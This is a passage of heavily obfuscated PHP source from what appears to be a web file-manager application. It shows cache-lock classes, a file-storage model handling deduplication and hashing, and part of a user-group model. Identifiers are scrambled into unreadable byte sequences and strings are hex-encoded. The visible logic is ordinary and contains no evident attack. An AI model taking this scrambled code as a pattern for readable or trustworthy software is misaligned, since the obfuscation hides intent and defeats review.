$ÜÀù„ È); fwrite($¼×†Â°, $›ì¥); clearstatcache(); if ($¼×†Â° && $¸îÚæ) { return !0; } cacheLockWait(); } while (microtime(!0) < $›ì¥); $this->unlock($Ñò‹À¨ì); return !1; } public function lockGet($¯óˆğñç) { $àÈ—÷œ« =& $_SERVER[ĞÂ¤àÓï]; $À¡¾ß×‡ = rtrim(self::$cachePath, $àÈ—÷œ«[8]) . $àÈ—÷œ«[866] . md5($¯óˆğñç) . $àÈ—÷œ«[863]; return file_exists($À¡¾ß×‡); } public function unlock($—Üœ¡´Ñ) { $ûÔ”àÛá =& $_SERVER[ĞÂ¤àÓï]; $ÁÉÈÈØ¬ = self::$caches[$—Üœ¡´Ñ]; if (!$ÁÉÈÈØ¬) { return; } @flock($ÁÉÈÈØ¬[$ûÔ”àÛá[868]], LOCK_UN); @fclose($ÁÉÈÈØ¬[$ûÔ”àÛá[868]]); @unlink($ÁÉÈÈØ¬[$ûÔ”àÛá[199]]); unset(self::$caches[$—Üœ¡´Ñ]); } } class CacheLockRedis { public function lock($ãË›Ğ±è, $¿Ë¢øü = 10) { $·œ”™«Ÿ = Cache::init(); $‹¦°™†¤ = microtime(!0) + $¿Ë¢øü; while (microtime(!0) < $‹¦°™†¤) { $ªÏ¼ÓÓÒ = $·œ”™«Ÿ->get($ãË›Ğ±è); if (!$ªÏ¼ÓÓÒ) { $âô—»æ˜ = $·œ”™«Ÿ->setLock($ãË›Ğ±è, $‹¦°™†¤, $¿Ë¢øü); if ($âô—»æ˜) { return !0; } } else { if ($ªÏ¼ÓÓÒ < microtime(!0)) { $·œ”™«Ÿ->set($ãË›Ğ±è, $‹¦°™†¤, $¿Ë¢øü * 2); if ($·œ”™«Ÿ->get($ãË›Ğ±è) === $ªÏ¼ÓÓÒ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ŞßòîÊ) { return Cache::init()->get($ŞßòîÊ); } public function unlock($’¤ö±µÖ) { return Cache::init()->remove($’¤ö±µÖ); } } class CacheLockMemcached { public function lock($ÒÅúğ , $§˜ƒ¿¯â = 0) { $À¦úÌ™ = Cache::init(); $¸—¦µùë = microtime(!0) + $§˜ƒ¿¯â; while (microtime(!0) < $¸—¦µùë) { $¥öæ¯€ª = $À¦úÌ™->get($ÒÅúğ ); if (!$¥öæ¯€ª || $¥öæ¯€ª < microtime(!0)) { $«‘×…¶ó = $À¦úÌ™->handle->add($ÒÅúğ , $¸—¦µùë, $§˜ƒ¿¯â); if ($«‘×…¶ó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($è€İ±’Í) { return Cache::init()->get($è€İ±’Í); } public function unlock($¨óŠïÕê) { return Cache::init()->remove($¨óŠïÕê); } } goto DĞˆ¯»ÀÊÅ; BØÄîø´–: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145\x5f\x63\157\156\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\163\145\162\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145"; protected $tableMeta = array("\164\141\142\154\145\116\x61\155\x65" => "\x69\x6f\137\146\151\x6c\x65\137\x6d\145\164\x61", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\146\x69\x6c\x65\111\x44"); public function fileInfo($±òíğÃ) { $…Ô¶ûğ =& $_SERVER[ĞÂ¤àÓï]; static $¥Ö¼§ Á = array(); if (!isset($¥Ö¼§ Á[$±òíğÃ])) { $íÂ¨©çİ = $…Ô¶ûğ[1903]; $Îïæ« = Model($…Ô¶ûğ[471])->field($íÂ¨©çİ)->where(array($…Ô¶ûğ[469] => $±òíğÃ))->find(); $¥Ö¼§ Á[$±òíğÃ] = $Îïæ«; } return $¥Ö¼§ Á[$±òíğÃ]; } public function addFileByContent($ŸİÆß‘ = '', $çøğœîÙ = '') { $ÖíŞéäÉ =& $_SERVER[ĞÂ¤àÓï]; $—Â¨–Û² = TEMP_PATH . $ÖíŞéäÉ[1904]; if (!is_dir($—Â¨–Û²)) { mk_dir($—Â¨–Û²); } $Ä¨Öü®— = $—Â¨–Û² . $ÖíŞéäÉ[1905] . rand_string(16); file_put_contents($Ä¨Öü®—, $ŸİÆß‘); $°ğçÛÏË = $this->addFile($Ä¨Öü®—, $çøğœîÙ, !0); if (file_exists($Ä¨Öü®—)) { @unlink($Ä¨Öü®—); } return $°ğçÛÏË; } public function createFileName($Ö·¬Úš, $ì‚·¶ºâ = false, $ŒÇçÅªº = false) { $ˆé’¾¨ =& $_SERVER[ĞÂ¤àÓï]; $ÏÄ²àˆ” = IO::init($ˆé’¾¨[8]); $ß„Äß©Õ = $this->makeFilePath($Ö·¬Úš, $ÏÄ²àˆ”, $ì‚·¶ºâ, $ŒÇçÅªº); $îÈ«±ã… = $ÏÄ²àˆ”->pathFather($ß„Äß©Õ); static $¨ã­¼§æ = false; $­æŞÜË­ = $ˆé’¾¨[1906] . md5($îÈ«±ã…); if (!$¨ã­¼§æ && !Cache::get($­æŞÜË­)) { $¨ã­¼§æ = !0; $İ§¢¥¿Ì = IO::mkdir($îÈ«±ã…); if (!IO::exist($İ§¢¥¿Ì . $ˆé’¾¨[804])) { IO::mkfile($İ§¢¥¿Ì . $ˆé’¾¨[804]); } Cache::set($­æŞÜË­, 1, 3600 * 2); } return $ß„Äß©Õ; } public function makeFilePath($•¬Ó§¶«, $ —ŞöĞ , $á÷ôİ¦Ü = false, $Ì¥ÙùŸ¨ = false) { $Œ’¨¸Û =& $_SERVER[ĞÂ¤àÓï]; $®ãÂÃù = Model($Œ’¨¸Û[769])->get($Œ’¨¸Û[1907]); $ŒÄŸ´¾º = KodIO::defaultIO() . date($Œ’¨¸Û[1908]); $±Ã¯±Á = $ŒÄŸ´¾º . rand_string(5) . short_id(100); $•¬Ó§¶« = str_replace($Œ’¨¸Û[8], $Œ’¨¸Û[11], KodIO::clear($•¬Ó§¶«)); $æíÌæíº = $ —ŞöĞ ->ext($•¬Ó§¶«); if (!$•¬Ó§¶«) { $®ãÂÃù = $Œ’¨¸Û[1909]; } switch ($®ãÂÃù) { case $Œ’¨¸Û[1910]: $±Ã¯±Á = $±Ã¯±Á . $Œ’¨¸Û[10] . $ —ŞöĞ ->ext($•¬Ó§¶«); if ($æíÌæíº == $Œ’¨¸Û[1847]) { $±Ã¯±Á .= $Œ’¨¸Û[1207]; } break; case $Œ’¨¸Û[1911]: $úÅÖ¯óÒ = Model($Œ’¨¸Û[769])->get($Œ’¨¸Û[770]); $¬˜®„ç° = substr(md5($Œ’¨¸Û[771] . $úÅÖ¯óÒ . date($Œ’¨¸Û[747])), 0, 8); $›ÏíÎ¤Á = KodIO::defaultDriver(); $ŒÄŸ´¾º = $Œ’¨¸Û[1238] . $›ÏíÎ¤Á[$Œ’¨¸Û[399]] . $Œ’¨¸Û[409] . date($Œ’¨¸Û[1912]) . $¬˜®„ç° . $Œ’¨¸Û[8]; if ($æíÌæíº == $Œ’¨¸Û[1847]) { $•¬Ó§¶« .= $Œ’¨¸Û[1207]; } $éÚÓŸï = $Œ’¨¸Û[1913] . $ŒÄŸ´¾º . $•¬Ó§¶«; CacheLock::lock($éÚÓŸï); $±Ã¯±Á = $ŒÄŸ´¾º . $•¬Ó§¶«; if (IO::exist($ŒÄŸ´¾º . $•¬Ó§¶«)) { $öã€ÎÇ¯ = substr($•¬Ó§¶«, 0, strlen($•¬Ó§¶«) - strlen($æíÌæíº)); $¤ª¨ÈŸ“ = $Ì¥ÙùŸ¨ ? substr($Ì¥ÙùŸ¨, 0, 5) : ($á÷ôİ¦Ü ? substr($á÷ôİ¦Ü, 0, 5) : rand_string(5)); $±Ã¯±Á = $ŒÄŸ´¾º . $öã€ÎÇ¯ . $¤ª¨ÈŸ“ . $Œ’¨¸Û[10] . $æíÌæíº; } if (IO::isTypeObject($±Ã¯±Á) && !IO::isUploadServer($±Ã¯±Á)) { if (IO::exist($±Ã¯±Á)) { return $±Ã¯±Á; } $¢¬„Êˆº = IO::setContent($±Ã¯±Á, $Œ’¨¸Û[12]); if (!$¢¬„Êˆº) { show_json($Œ’¨¸Û[1914], !1); } } CacheLock::unlock($éÚÓŸï); break; case $Œ’¨¸Û[1909]: break; default: break; } return $±Ã¯±Á; } public function addFileByRemote($Â°¸çœã, $°Î›¸ , $¡ŒòÖÅ‡ = array()) { $·»§›æù =& $_SERVER[ĞÂ¤àÓï]; if (!IO::exist($Â°¸çœã)) { return !1; } $ÉöÅæÛÄ = $¡ŒòÖÅ‡[$·»§›æù[176]] ? $¡ŒòÖÅ‡[$·»§›æù[176]] : $·»§›æù[12]; $üô‘Ü¸ = IO::hashMd5($Â°¸çœã, $ÉöÅæÛÄ); $ñ¿ç½©’ = KodIO::defaultDriver(); $Çíá‰‡í = array($·»§›æù[585] => IO::size($Â°¸çœã), $·»§›æù[1915] => 1, $·»§›æù[420] => $°Î›¸ , $·»§›æù[815] => $ñ¿ç½©’[$·»§›æù[399]], $·»§›æù[421] => $Â°¸çœã, $·»§›æù[1916] => $¡ŒòÖÅ‡[$·»§›æù[177]] ? $¡ŒòÖÅ‡[$·»§›æù[177]] : IO::hashSimple($Â°¸çœã), $·»§›æù[1917] => $üô‘Ü¸ ? $üô‘Ü¸ : $ÉöÅæÛÄ); if ($Ãƒ½³Õş = $this->addFileCheckExist($Çíá‰‡í[$·»§›æù[177]], $Çíá‰‡í[$·»§›æù[176]], $Çíá‰‡í[$·»§›æù[76]])) { return $Ãƒ½³Õş; } return $this->addFileData($Çíá‰‡í); } private function addFileData($ÏËÒİ‡É) { $¤æÂš£° =& $_SERVER[ĞÂ¤àÓï]; if (!$ÏËÒİ‡É) { return !1; } $ÏËÒİ‡É[$¤æÂš£°[76]] = intval($ÏËÒİ‡É[$¤æÂš£°[76]]); if (!$ÏËÒİ‡É[$¤æÂš£°[76]] && strlen($ÏËÒİ‡É[$¤æÂš£°[177]]) > 32) { $ÏËÒİ‡É[$¤æÂš£°[76]] = intval(substr($ÏËÒİ‡É[$¤æÂš£°[177]], 32)); } $ïàªûÓë = $this->add($ÏËÒİ‡É); return $this->find($ïàªûÓë); } public function addFile($Ñ»ĞÒª, $¯©‘—‰ß, $¸Ôé¢²³ = false) { $š¶¢Øğ– =& $_SERVER[ĞÂ¤àÓï]; $‚ôÒÓî = IO::hashSimple($Ñ»ĞÒª); $¡«¢ò = IO::size($Ñ»ĞÒª); $ˆëäˆ­à = $¡«¢ò <= 1024 * 1024 * 10 ? IO::hashMd5($Ñ»ĞÒª) : $š¶¢Øğ–[12]; $•¸ù¼ü = $š¶¢Øğ–[1918] . $‚ôÒÓî; CacheLock::lock($•¸ù¼ü); if ($ˆëäˆ­à && $‚ôÒÓî) { $ÓÃŞ¢ò = $this->addFileCheckExist($‚ôÒÓî, $ˆëäˆ­à, $¡«¢ò); if ($ÓÃŞ¢ò) { CacheLock::unlock($•¸ù¼ü); return $ÓÃŞ¢ò; } } $¢·†ø² = $this->addFileMake($Ñ»ĞÒª, $¡«¢ò, $‚ôÒÓî, $ˆëäˆ­à, $¯©‘—‰ß, $¸Ôé¢²³); $¼Ë’ğîÚ = $this->addFileData($¢·†ø²); CacheLock::unlock($•¸ù¼ü); if (!$ˆëäˆ­à && $¼Ë’ğîÚ) { $this->fileMd5Check($¼Ë’ğîÚ); } return $¼Ë’ğîÚ; } private function fileMd5Check($´¦¤Íúª) { $ şÆä¾ =& $_SERVER[ĞÂ¤àÓï]; $Øİı± è = array($´¦¤Íúª[$ şÆä¾[468]], $´¦¤Íúª[$ şÆä¾[84]]); $®­Û¬æë = $ şÆä¾[1919] . $´¦¤Íúª[$ şÆä¾[84]]; $ï²“·›§ = $ şÆä¾[1920] . $´¦¤Íúª[$ şÆä¾[468]]; $‰»ºŒ‡Û = TaskQueue::add($ şÆä¾[1921], $Øİı± è, $®­Û¬æë, $ï²“·›§); if (!$‰»ºŒ‡Û) { $this->fileMd5Set($´¦¤Íúª[$ şÆä¾[468]], $´¦¤Íúª[$ şÆä¾[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¯‹Ê«Áô, $¥­üşĞÍ) { $‘±Ôè¦  =& $_SERVER[ĞÂ¤àÓï]; $õØà—°ğ = $this->find($¯‹Ê«Áô); if (!$õØà—°ğ || $õØà—°ğ[$‘±Ôè¦ [176]]) { return; } $§óİËë = IO::hashMd5($¥­üşĞÍ); if (!$§óİËë) { return $‘±Ôè¦ [12]; } $this->where(array($‘±Ôè¦ [468] => $¯‹Ê«Áô))->save(array($‘±Ôè¦ [176] => $§óİËë)); } public function addFileMake($„ÑÂÂ´Ó, $À‹´şÄÒ, $†ğ‘¼æ•, $»Ì‹Õ–, $‡ø¶’í®, $ªš³í‘) { $…®×À‰ =& $_SERVER[ĞÂ¤àÓï]; $ÕÂæŞôÄ = $this->createFileName($‡ø¶’í®, $†ğ‘¼æ•, $»Ì‹Õ–); $»¨ãí‘¡ = get_path_father($ÕÂæŞôÄ); $¨Ã˜Ü‡© = get_path_this($ÕÂæŞôÄ); if ($ªš³í‘) { $¾óÕÆ•ä = IO::move($„ÑÂÂ´Ó, $»¨ãí‘¡, !1, $¨Ã˜Ü‡©); } else { $¾óÕÆ•ä = IO::copy($„ÑÂÂ´Ó, $»¨ãí‘¡, !1, $¨Ã˜Ü‡©); } if (!$¾óÕÆ•ä) { return !1; } $Ëè°•œ€ = KodIO::defaultDriver(); $Ø¢†Ÿ¦ = array($…®×À‰[585] => $À‹´şÄÒ, $…®×À‰[1915] => 1, $…®×À‰[420] => $‡ø¶’í®, $…®×À‰[815] => $Ëè°•œ€[$…®×À‰[399]], $…®×À‰[421] => $ÕÂæŞôÄ, $…®×À‰[1916] => $†ğ‘¼æ•, $…®×À‰[1917] => $»Ì‹Õ–); return $Ø¢†Ÿ¦; } public function addFileCheckExist($Îô‹Œ±Ê, $ë•×Ù³¤, $››œõÜç) { $‡šù÷Œ =& $_SERVER[ĞÂ¤àÓï]; $ÅÓõºÈÚ = $this->findByHash($Îô‹Œ±Ê, $ë•×Ù³¤); if (!$ÅÓõºÈÚ) { return !1; } $İ§£ÔÃ• = array($‡šù÷Œ[1915] => intval($ÅÓõºÈÚ[$‡šù÷Œ[1922]]) + 1, $‡šù÷Œ[585] => $››œõÜç); $this->where(array($‡šù÷Œ[469] => $ÅÓõºÈÚ[$‡šù÷Œ[468]]))->save($İ§£ÔÃ•); return $ÅÓõºÈÚ; } public function remove($şëñ„£) { $this->linkCountChange($şëñ„£, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÈäßæÖ“) { $this->linkCountChange($ÈäßæÖ“, !0); } public function linkCountChange($°âØËËø, $ÊƒƒÙ¿) { $Ù™ä‚Ûé =& $_SERVER[ĞÂ¤àÓï]; if (!$°âØËËø) { return; } if (!is_array($°âØËËø)) { $°âØËËø = array($°âØËËø); } $·¹õ‚¯Ú = array(); foreach ($°âØËËø as $õÅÎ·”Ô) { $âÖÁ²ª = $õÅÎ·”Ô . $Ù™ä‚Ûé[12]; if (!$·¹õ‚¯Ú[$âÖÁ²ª]) { $·¹õ‚¯Ú[$âÖÁ²ª] = 0; } $·¹õ‚¯Ú[$âÖÁ²ª]++; } $§ˆ¹í¨à = array(); foreach ($·¹õ‚¯Ú as $õÅÎ·”Ô => $”íàç’ê) { $âÖÁ²ª = $”íàç’ê . $Ù™ä‚Ûé[12]; if (!$§ˆ¹í¨à[$âÖÁ²ª]) { $§ˆ¹í¨à[$âÖÁ²ª] = array(); } $§ˆ¹í¨à[$âÖÁ²ª][] = $õÅÎ·”Ô; } foreach ($§ˆ¹í¨à as $”íàç’ê => $ÂÅĞÄ´¬) { if (!$ÂÅĞÄ´¬) { continue; } $”íàç’ê = $ÊƒƒÙ¿ ? $”íàç’ê : -intval($”íàç’ê); $¸á¹—˜û = array($Ù™ä‚Ûé[468] => array($Ù™ä‚Ûé[7], $ÂÅĞÄ´¬)); if ($”íàç’ê < 0) { $¸á¹—˜û[$Ù™ä‚Ûé[1922]] = array($Ù™ä‚Ûé[1015], abs($”íàç’ê)); } $this->where($¸á¹—˜û)->setAdd($Ù™ä‚Ûé[1922], $”íàç’ê); } } public function findByHash($Üß¨÷“, $âºİªß = false) { $ï³İä‘ =& $_SERVER[ĞÂ¤àÓï]; if (!$Üß¨÷“ && !$âºİªß) { return !1; } $µíšïÖ¼ = array($ï³İä‘[1916] => $Üß¨÷“); if ($âºİªß) { $µíšïÖ¼ = array($ï³İä‘[1917] => $âºİªß); } return $this->order($ï³İä‘[1923])->where($µíšïÖ¼)->find(); } public function clearEmpty($‚ˆ”†ƒœ = 0) { $Ùç×‡Ö² =& $_SERVER[ĞÂ¤àÓï]; $µõ˜úë = time() - 3600 * 24 * $‚ˆ”†ƒœ; $ıéŠÕ­ó = $Ùç×‡Ö²[1924] . $µõ˜úë; $¡ë’ö±Œ = $this->where($ıéŠÕ­ó)->select(); if (!$¡ë’ö±Œ) { return; } $ÜŒ¥²Æ = new Task($Ùç×‡Ö²[1925], $Ùç×‡Ö²[12], count($¡ë’ö±Œ)); foreach ($¡ë’ö±Œ as $³ÖÂÔÁå) { $ÜŒ¥²Æ->update(1); $this->resetFile($³ÖÂÔÁå); } $ÜŒ¥²Æ->end(); } public function resetFile($Œı€Á”Ú) { $·®şıı =& $_SERVER[ĞÂ¤àÓï]; $ßİş«Šä = array($·®şıı[469] => $Œı€Á”Ú[$·®şıı[468]]); $±Ü†öÛ… = Model($·®şıı[1336])->where($ßİş«Šä)->count(); $€Šµ÷™î = Model($·®şıı[1926])->where($ßİş«Šä)->count(); $Ö øİ¡ = intval($±Ü†öÛ…) + intval($€Šµ÷™î); if ($Ö øİ¡ == 0) { IO::remove($Œı€Á”Ú[$·®şıı[84]]); Model($·®şıı[1927])->delete($Œı€Á”Ú[$·®şıı[468]]); $this->where($ßİş«Šä)->delete(); $this->metaSet($Œı€Á”Ú[$·®şıı[468]], null, null); return; } if ($Œı€Á”Ú[$·®şıı[1922]] != $Ö øİ¡) { $this->where($ßİş«Šä)->save(array($·®şıı[1915] => $Ö øİ¡)); } } public function storageInfo($¨óÊÖãì = false) { $†ä–“Á„ =& $_SERVER[ĞÂ¤àÓï]; $†¨˜ ı = $this->count() + 0.0; $øˆ–òåî = 0; $„Éü¤‚ = 1; $²óíÎëÙ = 0; $Œ©Ú¶ı˜ = 5000; for ($ôÏÌÎÈÙ = 0; $ôÏÌÎÈÙ < $†¨˜ ı; $ôÏÌÎÈÙ = $ôÏÌÎÈÙ + $Œ©Ú¶ı˜) { $âÑÜÔº = $this->limit($ôÏÌÎÈÙ, $ôÏÌÎÈÙ + $Œ©Ú¶ı˜)->select(); foreach ($âÑÜÔº as $çÆıœö) { $„Éü¤‚ += $çÆıœö[$†ä–“Á„[76]] * $çÆıœö[$†ä–“Á„[1922]]; $øˆ–òåî += $çÆıœö[$†ä–“Á„[76]] * ($çÆıœö[$†ä–“Á„[1922]] - 1); $²óíÎëÙ += $çÆıœö[$†ä–“Á„[1922]]; } } $Ü¦íÒÕê = array($†ä–“Á„[1928] => $„Éü¤‚, $†ä–“Á„[1929] => $øˆ–òåî, $†ä–“Á„[1930] => $øˆ–òåî / $„Éü¤‚, $†ä–“Á„[80] => $†¨˜ ı, $†ä–“Á„[1931] => $²óíÎëÙ); return $Ü¦íÒÕê; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\x65" => "\147\162\157\x75\x70\x5f\155\x65\164\x61", "\155\145\164\141\x46\x69\145\154\144" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($Ùß•Ê”ß) { $æã×°•Û =& $_SERVER[ĞÂ¤àÓï]; return array($æã×°•Û[1932] => array($Ùß•Ê”ß[0], $æã×°•Û[1933]), $æã×°•Û[1934] => array($Ùß•Ê”ß[0], $æã×°•Û[1935])); } protected function getInfo($ªÎÀ¬”Ö, $ÚÆš€ş« = false) { $¯™Ú˜À = $this->getInfoSimple($ªÎÀ¬”Ö); if (!$¯™Ú˜À) { return !1; } if ($ÚÆš€ş«) { return $this->_listDataApplyItem($¯™Ú˜À); } return $this->cacheFunctionGet($_SERVER[ĞÂ¤àÓï][1936], $ªÎÀ¬”Ö); } protected function getInfoSimple($»³Ëé¨‘, $Š‡Î»¬È = false) { $Ç˜®ƒ®¢ =& $_SERVER[ĞÂ¤àÓï]; if ($Š‡Î»¬È) { $ãÂò®ü„ = array($Ç˜®ƒ®¢[1854] => intval($»³Ëé¨‘)); $ËèÉ³ñô = $this->where($ãÂò®ü„)->find(); return is_array($ËèÉ³ñô) ? $ËèÉ³ñô : array(); } return $this->cacheFunctionGet($Ç˜®ƒ®¢[1937], $»³Ëé¨‘); } protected function groupAdd($ÚÌäßì) { $Ê†Ûì€½ =& $_SERVER[ĞÂ¤àÓï]; if (!$ÚÌäßì[$Ê†Ûì€½[432]] && isset($ÚÌäßì[$Ê†Ûì€½[1854]]) && $ÚÌäßì[$Ê†Ûì€½[1854]] == 1) { if ($Ş¾çç¥ = $this->getInfoSimple($ÚÌäßì[$Ê†Ûì€½[1854]], !0)) { return $ÚÌäßì[$Ê†Ûì€½[1854]]; } } else { $Ş¾çç¥ = $this->getInfoSimple($ÚÌäßì[$Ê†Ûì€½[432]]); if (!$Ş¾çç¥) { return !1; } } $Ÿê§µ… = $Ê†Ûì€½[531]; if ($Ş¾çç¥[$Ê†Ûì€½[521]]) { $Ÿê§µ… = $Ş¾çç¥[$Ê†Ûì€½[521]] . $Ş¾çç¥[$Ê†Ûì€½[1854]] . $Ê†Ûì€½[50]; } $¼ã¨º”± = array($Ê†Ûì€½[420] => $this->groupNameAuto($ÚÌäßì[$Ê†Ûì€½[432]], $ÚÌäßì[$Ê†Ûì€½[32]]), $Ê†Ûì€½[401] => $ÚÌäßì[$Ê†Ûì€½[432]], $Ê†Ûì€½[590] => $Ÿê§µ…, $Ê†Ûì€½[1938] => $ÚÌäßì[$Ê†Ûì€½[1841]], $Ê†Ûì€½[1939] => 0, $Ê†Ûì€½[1858] => 0); if (isset($ÚÌäßì[$Ê†Ûì€½[1878]])) { $¼ã¨º”±[$Ê†Ûì€½[1878]] = $ÚÌäßì[$Ê†Ûì€½[1878]]; } else { $Ö¦ÓÕ‚µ = $this->max($Ê†Ûì€½[1878]); if (!$Ö¦ÓÕ‚µ) { $Ö¦ÓÕ‚µ = 0; } $¼ã¨º”±[$Ê†Ûì€½[1878]] = $Ö¦ÓÕ‚µ + 1; } if (!empty($ÚÌäßì[$Ê†Ûì€½[1854]])) { $¼ã¨º”±[$Ê†Ûì€½[1854]] = $ÚÌäßì[$Ê†Ûì€½[1854]]; } $ºˆˆ·™ = $this->add($¼ã¨º”±); $this->setNamePinyin($ºˆˆ·™, $¼ã¨º”±[$Ê†Ûì€½[32]]); if (isset($ÚÌäßì[$Ê†Ûì€½[1940]])) { $this->metaSet($ºˆˆ·™, array($Ê†Ûì€½[1940] => $ÚÌäßì[$Ê†Ûì€½[1940]], $Ê†Ûì€½[1941] => $ÚÌäßì[$Ê†Ûì€½[1941]])); unset($ÚÌäßì[$Ê†Ûì€½[1940]]); unset($ÚÌäßì[$Ê†Ûì€½[1941]]); } Model($Ê†Ûì€½[1336])->groupRootAdd($ºˆˆ·™); return $ºˆˆ·™; } protected function groupEdit($üÑÒñ®…, $À÷Óõ„·) { $üÛ’Ø©• =& $_SERVER[ĞÂ¤àÓï]; $™ëääÕû = $this->getInfoSimple($üÑÒñ®…); if (!$™ëääÕû) { return !1; } if (!empty($À÷Óõ„·[$üÛ’Ø©•[432]])) { $Õ³ÌøÈ = $this->getInfoSimple($À÷Óõ„·[$üÛ’Ø©•[432]]); if (!$Õ³ÌøÈ) { return !1; } if ($™ëääÕû[$üÛ’Ø©•[1854]] == $Õ³ÌøÈ[$üÛ’Ø©•[1854]]) { return !1; } if ($À÷Óõ„·[$üÛ’Ø©•[432]] != $™ëääÕû[$üÛ’Ø©•[432]]) { if ($Õ³ÌøÈ[$üÛ’Ø©•[521]] !== $™ëääÕû[$üÛ’Ø©•[521]] && strpos($Õ³ÌøÈ[$üÛ’Ø©•[521]], $™ëääÕû[$üÛ’Ø©•[521]] . $™ëääÕû[$üÛ’Ø©•[1854]] . $üÛ’Ø©•[50]) === 0) { return !1; } $À÷Óõ„·[$üÛ’Ø©•[590]] = $Õ³ÌøÈ[$üÛ’Ø©•[521]] . $À÷Óõ„·[$üÛ’Ø©•[432]] . $üÛ’Ø©•[50]; $this->_changeChildLevel($™ëääÕû, $Õ³ÌøÈ); } } if (isset($À÷Óõ„·[$üÛ’Ø©•[32]])) { $this->setNamePinyin($üÑÒñ®…, $À÷Óõ„·[$üÛ’Ø©•[32]]); } if (isset($À÷Óõ„·[$üÛ’Ø©•[1940]])) { $this->metaSet($üÑÒñ®…, array($üÛ’Ø©•[1940] => $À÷Óõ„·[$üÛ’Ø©•[1940]], $üÛ’Ø©•[1941] => $À÷Óõ„·[$üÛ’Ø©•[1941]])); unset($À÷Óõ„·[$üÛ’Ø©•[1940]]); unset($À÷Óõ„·[$üÛ’Ø©•[1941]]); } $this->_clearChildrenCache($™ëääÕû); return $this->where(array($üÛ’Ø©•[1942] => $üÑÒñ®…))->save($À÷Óõ„·); } private function _clearChildrenCache($ÈÓ¨œÍñ) { $‰ŞùœÏŒ =& $_SERVER[ĞÂ¤àÓï]; $µùÕá = array($‰ŞùœÏŒ[590] => array($‰ŞùœÏŒ[550], $ÈÓ¨œÍñ[$‰ŞùœÏŒ[521]] . $ÈÓ¨œÍñ[$‰ŞùœÏŒ[1854]] . $‰ŞùœÏŒ[551])); $¢ŠÍ™ƒà = $this->field($‰ŞùœÏŒ[1854])->where($µùÕá)->select(); foreach ($¢ŠÍ™ƒà as $¦æşÛ£“) { $this->_clearCache($¦æşÛ£“[$‰ŞùœÏŒ[1854]]); } } private function _clearCache($åáØÍ¸²) { $•«‡õ†Ö =& $_SERVER[ĞÂ¤àÓï]; $this->cacheFunctionClear($•«‡õ†Ö[1936], $åáØÍ¸²); $this->cacheFunctionClear($•«‡õ†Ö[1937], $åáØÍ¸²); } private function _changeChildLevel($‰Œ‰…ÎÀ, $ñ›‚µı, $Õ˜Èî±› = false) { $¾Ã·®¥ç =& $_SERVER[ĞÂ¤àÓï]; $ûñùµ¾ = $‰Œ‰…ÎÀ[$¾Ã·®¥ç[521]] . $‰Œ‰…ÎÀ[$¾Ã·®¥ç[1854]] . $¾Ã·®¥ç[50]; $–Ò¦ ’ = $ñ›‚µı[$¾Ã·®¥ç[521]] . $ñ›‚µı[$¾Ã·®¥ç[1854]] . $¾Ã·®¥ç[50] . $‰Œ‰…ÎÀ[$¾Ã·®¥ç[1854]] . $¾Ã·®¥ç[50]; if ($Õ˜Èî±›) { $–Ò¦ ’ = $ñ›‚µı[$¾Ã·®¥ç[521]] . $ñ›‚µı[$¾Ã·®¥ç[1854]] . $¾Ã·®¥ç[50]; } $ò´ÔˆßÒ = array($¾Ã·®¥ç[590] => array($¾Ã·®¥ç[550], $‰Œ‰…ÎÀ[$¾Ã·®¥ç[521]] . $‰Œ‰…ÎÀ[$¾Ã·®¥ç[1854]] . $¾Ã·®¥ç[551])); $Ğ‡šÜ€ë = array($¾Ã·®¥ç[590] => array($¾Ã·®¥ç[599], "\x72\145\x70\154\141\x63\x65\x28\160\x61\162\x65\156\x74\x4c\145\166\x65\x6c\54\47{$ûñùµ¾}\47\54\x27{$–Ò¦ ’}\x27\51")); $this->_clearChildrenCache($‰Œ‰…ÎÀ); $this->where($ò´ÔˆßÒ)->data($Ğ‡šÜ€ë)->save(); } public function setNamePinyin($÷‘îæüü, $À»šöÒÓ = false) { $¹íÙÂ =& $_SERVER[ĞÂ¤àÓï]; if (!$À»šöÒÓ) { $º§ü×Š· = $this->getInfoSimple($÷‘îæüü); $À»šöÒÓ = $º§ü×Š·[$¹íÙÂ[32]]; } if (!Input::check($À»šöÒÓ, $¹íÙÂ[593])) { $this->metaSet($÷‘îæüü, $¹íÙÂ[465], null); $this->metaSet($÷‘îæüü, $¹íÙÂ[464], null); return; } $ß­şĞÜÊ = array($¹íÙÂ[465] => str_replace($¹íÙÂ[53], $¹íÙÂ[12], Pinyin::get($À»šöÒÓ)), $¹íÙÂ[464] => Pinyin::get($À»šöÒÓ, $¹íÙÂ[594])); $this->metaSet($÷‘îæüü, $ß­şĞÜÊ); } protected function groupStatus($é¿¨Ù×, $ÊÓñµæ) { $äÊü´İÌ =& $_SERVER[ĞÂ¤àÓï]; $¬‹µçé’ = $this->getInfoSimple($é¿¨Ù×); if (!$¬‹µçé’) { return !1; } if ($ÊÓñµæ == $äÊü´İÌ[88]) { $Ô£Ğøä¦ = $this->parentLevelArray($¬‹µçé’[$äÊü´İÌ[521]]); } else { $€¬¸Ô«ø = array($äÊü´İÌ[590] => array($äÊü´İÌ[550], $¬‹µçé’[$äÊü´İÌ[521]] . $¬‹µçé’[$äÊü´İÌ[1854]] . $äÊü´İÌ[551])); $Ô£Ğøä¦ = $this->where($€¬¸Ô«ø)->field($äÊü´İÌ[1854])->select(); $Ô£Ğøä¦ = array_to_keyvalue($Ô£Ğøä¦, $äÊü´İÌ[12], $äÊü´İÌ[1854]); } $Ô£Ğøä¦[] = $¬‹µçé’[$äÊü´İÌ[1854]]; $×¨¤›ãï = array(); foreach ($Ô£Ğøä¦ as $é¿¨Ù×) { $×¨¤›ãï[] = array($äÊü´İÌ[1854] => $é¿¨Ù×, $äÊü´İÌ[94] => $äÊü´İÌ[749], $äÊü´İÌ[374] => $ÊÓñµæ); 